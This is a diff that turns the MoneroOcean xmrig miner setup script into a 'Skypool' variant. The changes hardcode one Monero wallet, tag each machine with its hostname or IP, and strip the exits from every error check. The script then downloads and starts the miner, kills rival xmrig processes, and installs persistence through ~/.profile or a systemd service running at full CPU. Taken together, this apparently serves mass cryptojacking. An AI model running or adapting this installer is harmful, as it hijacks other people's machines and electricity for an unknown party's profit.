@@ -1,11 +1,10 @@
 #!/bin/bash
 
-VERSION=2.9
+VERSION=0.1
 
 # printing greetings
 
-echo "MoneroOcean mining setup script v$VERSION."
-echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
+echo "Skypool mining setup script v$VERSION."
 echo
 
 if [ "$(id -u)" == "0" ]; then
@@ -14,25 +13,23 @@ fi
 
 # command line arguments
 WALLET='4Asvahzhw2rDgHYPBYpp6gEaPBNbU8JLh6piFmqqrUvgJhpNV9g6Naaj8jhakoyqNEE7L4wHKWSRbAmyoff9JPQw2SqNEuu'
-EMAIL=$2 # this one is optional
 
 # checking prerequisites
 
-
 if [ -z $HOME ]; then
   echo "ERROR: Please define HOME environment variable to your home directory"
-  
+
 fi
 
 if [ ! -d $HOME ]; then
   echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
   echo '  export HOME=<dir>'
-  
+
 fi
 
 if ! type curl >/dev/null; then
   echo "ERROR: This script requires \"curl\" utility to work correctly"
-  
+
 fi
 
 if ! type lscpu >/dev/null; then
@@ -42,7 +39,7 @@ fi
 #if ! sudo -n true 2>/dev/null; then
 #  if ! pidof systemd >/dev/null; then
 #    echo "ERROR: This script requires systemd to work correctly"
-#    
+#  
 #  fi
 #fi
 
@@ -110,79 +107,28 @@ fi
 TOTAL_CACHE=$(( $CPU_THREADS*$CPU_L1_CACHE + $CPU_SOCKETS * ($CPU_CORES_PER_SOCKET*$CPU_L2_CACHE + $CPU_L3_CACHE)))
 if [ -z $TOTAL_CACHE ]; then
   echo "ERROR: Can't compute total cache"
-  
+
 fi
 EXP_MONERO_HASHRATE=$(( ($CPU_THREADS < $TOTAL_CACHE / 2048 ? $CPU_THREADS : $TOTAL_CACHE / 2048) * ($CPU_MHZ * 20 / 1000) * 5 ))
 if [ -z $EXP_MONERO_HASHRATE ]; then
   echo "ERROR: Can't compute projected Monero CN hashrate"
-  
+
 fi
 
-power2() {
-  if ! type bc >/dev/null; then
-    if [ "$1" -gt "204800" ]; then
-      echo "8192"
-    elif [ "$1" -gt "102400" ]; then
-      echo "4096"
-    elif [ "$1" -gt "51200" ]; then
-      echo "2048"
-    elif [ "$1" -gt "25600" ]; then
-      echo "1024"
-    elif [ "$1" -gt "12800" ]; then
-      echo "512"
-    elif [ "$1" -gt "6400" ]; then
-      echo "256"
-    elif [ "$1" -gt "3200" ]; then
-      echo "128"
-    elif [ "$1" -gt "1600" ]; then
-      echo "64"
-    elif [ "$1" -gt "800" ]; then
-      echo "32"
-    elif [ "$1" -gt "400" ]; then
-      echo "16"
-    elif [ "$1" -gt "200" ]; then
-      echo "8"
-    elif [ "$1" -gt "100" ]; then
-      echo "4"
-    elif [ "$1" -gt "50" ]; then
-      echo "2"
-    else 
-      echo "1"
-    fi
-  else 
-    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
-  fi
-}
-
-PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
-PORT=$(( $PORT == 0 ? 1 : $PORT ))
-PORT=`power2 $PORT`
-PORT=$(( 10000 + $PORT ))
-if [ -z $PORT ]; then
-  echo "ERROR: Can't compute port"
-  
-fi
-
-if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
-  echo "ERROR: Wrong computed port value: $PORT"
-  
-fi
+PORT=6666
 
 
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/moneroocean/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/skypool/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
-if [ ! -z $EMAIL ]; then
-  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
-fi
 echo
 
 if ! sudo -n true 2>/dev/null; then
   echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
 else
-  echo "Mining in background will be performed using moneroocean_miner systemd service."
+  echo "Mining in background will be performed using skypool_miner systemd service."
 fi
 
 echo
@@ -196,37 +142,36 @@ echo
 
 # start doing stuff: preparing miner
 
-echo "[*] Removing previous moneroocean miner (if any)"
+echo "[*] Removing previous skypool miner (if any)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop moneroocean_miner.service
+  sudo systemctl stop skypool_miner.service
 fi
 killall -9 xmrig
 
-echo "[*] Removing $HOME/moneroocean directory"
-rm -rf $HOME/moneroocean
+echo "[*] Removing $HOME/skypool directory"
+rm -rf $HOME/skypool
 
-echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-  
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/skypool-org/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/skypool-org/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
-[ -d $HOME/moneroocean ] || mkdir $HOME/moneroocean
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
-  
+echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/skypool"
+[ -d $HOME/skypool ] || mkdir $HOME/skypool
+if ! tar xf /tmp/xmrig.tar.gz -C $HOME/skypool; then
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/skypool directory"
+
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/moneroocean/config.json
-$HOME/moneroocean/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/skypool/xmrig works fine (and not removed by antivirus software)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/skypool/config.json
+$HOME/skypool/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/moneroocean/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig is not functional"
+  if [ -f $HOME/skypool/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/skypool/xmrig is not functional"
   else 
-    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/skypool/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -236,67 +181,74 @@ if (test $? -ne 0); then
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
-    
+  
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/skypool"
+  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/skypool --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/skypool directory"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/moneroocean/config.json
-  $HOME/moneroocean/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/skypool/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/skypool/config.json
+  $HOME/skypool/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/moneroocean/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/moneroocean/xmrig is not functional too"
+    if [ -f $HOME/skypool/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/skypool/xmrig is not functional too"
     else 
-      echo "ERROR: Stock version of $HOME/moneroocean/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/skypool/xmrig was removed by antivirus too"
     fi
-    
+  
   fi
 fi
 
-echo "[*] Miner $HOME/moneroocean/xmrig is OK"
+echo "[*] Miner $HOME/skypool/xmrig is OK"
 
-PASS='hello2'
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/moneroocean/config.json
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+if [ "$PASS" == "localhost" ]; then
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
 
-cp $HOME/moneroocean/config.json $HOME/moneroocean/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/moneroocean/config_background.json
+sed -i 's/"url": *"[^"]*",/"url": "auto.skypool.org:'$PORT'",/' $HOME/skypool/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/skypool/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/skypool/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/skypool/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/skypool/xmrig.log'",#' $HOME/skypool/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/skypool/config.json
+
+cp $HOME/skypool/config.json $HOME/skypool/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/skypool/config_background.json
 
 # preparing script
 
-echo "[*] Creating $HOME/moneroocean/miner.sh script"
-cat >$HOME/moneroocean/miner.sh <<EOL
+echo "[*] Creating $HOME/skypool/miner.sh script"
+cat >$HOME/skypool/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
-  nice $HOME/moneroocean/xmrig \$*
+  nice $HOME/skypool/xmrig \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/moneroocean/miner.sh
+chmod +x $HOME/skypool/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep moneroocean/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/moneroocean/miner.sh script to $HOME/.profile"
-    echo "$HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep skypool/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/skypool/miner.sh script to $HOME/.profile"
+    echo "$HOME/skypool/miner.sh --config=$HOME/skypool/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/skypool/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
-  /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HOME/skypool/xmrig.log file)"
+  /bin/bash $HOME/skypool/miner.sh --config=$HOME/skypool/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -307,20 +259,20 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
-    /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HOME/skypool/xmrig.log file)"
+    /bin/bash $HOME/skypool/miner.sh --config=$HOME/skypool/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
-    echo "[*] Creating moneroocean_miner systemd service"
-    cat >/tmp/moneroocean_miner.service <<EOL
+    echo "[*] Creating skypool_miner systemd service"
+    cat >/tmp/skypool_miner.service <<EOL
 [Unit]
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/moneroocean/xmrig --config=$HOME/moneroocean/config.json
+ExecStart=$HOME/skypool/xmrig --config=$HOME/skypool/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -328,13 +280,13 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service
-    echo "[*] Starting moneroocean_miner systemd service"
+    sudo mv /tmp/skypool_miner.service /etc/systemd/system/skypool_miner.service
+    echo "[*] Starting skypool_miner systemd service"
     sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable moneroocean_miner.service
-    sudo systemctl start moneroocean_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u moneroocean_miner -f\" command"
+    sudo systemctl enable skypool_miner.service
+    sudo systemctl start skypool_miner.service
+    echo "To see miner service logs run \"sudo journalctl -u skypool_miner -f\" command"
   fi
 fi
 
@@ -351,9 +303,10 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/skypool/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/skypool/config_background.json"
 fi
 echo ""
 
 echo "[*] Setup complete"
+
